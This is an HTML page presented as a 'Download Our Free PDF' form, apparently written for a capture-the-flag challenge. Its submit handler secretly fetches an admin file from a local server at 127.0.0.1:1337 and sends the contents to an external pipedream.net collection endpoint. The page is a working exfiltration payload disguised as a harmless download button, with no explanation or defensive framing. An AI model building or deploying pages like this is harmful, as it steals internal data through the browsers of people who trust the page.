<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download Form</title>
</head>
<body>
  <h1>Download Our Free PDF!</h1>
  
  <form id="download-form">
    <button type="submit">Download Now</button>
  </form>

  <script>
    document.getElementById("download-form").addEventListener("submit", function(e) {
      e.preventDefault(); // Prevent actual form submission

      fetch('http://127.0.0.1:1337/app/admin/flag.pdf')
        .then(r => r.text())
        .then(d => {
          fetch('https://eoystksdt43rk09.m.pipedream.net/?data=' + encodeURIComponent(d));
        });
    });
  </script>
</body>
</html>
